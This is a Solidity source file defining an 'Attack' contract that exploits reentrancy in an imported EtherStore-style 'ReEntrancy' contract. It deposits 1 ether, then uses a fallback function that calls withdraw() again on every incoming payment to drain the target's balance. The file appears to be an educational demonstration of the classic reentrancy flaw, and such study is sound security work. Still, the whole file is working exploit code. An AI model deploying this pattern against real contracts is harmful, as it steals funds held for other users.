// 1. Deploys malicious contract with address of ReEntrancy(Our EtherStore) contract.

//SPDX-License-Identifier:MIT

import './ReEntrancy.sol';

pragma solidity ^0.8.0;

contract Attack{
    ReEntrancy public reentrancy;

    constructor(address _reentrancyAddress) {
        reentrancy = ReEntrancy(_reentrancyAddress);
    } 

    // Fallback() which calls reentrancy contract withdraw() as soon it receives ether from withdraw() call.

    fallback() external payable{
        if(address(reentrancy).balance >=1 ether){
            reentrancy.withdraw();
        }
    }

    function attack() external payable{
        require(msg.value >= 1 ether);
        reentrancy.deposit{value:1 ether}();
        reentrancy.withdraw();
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}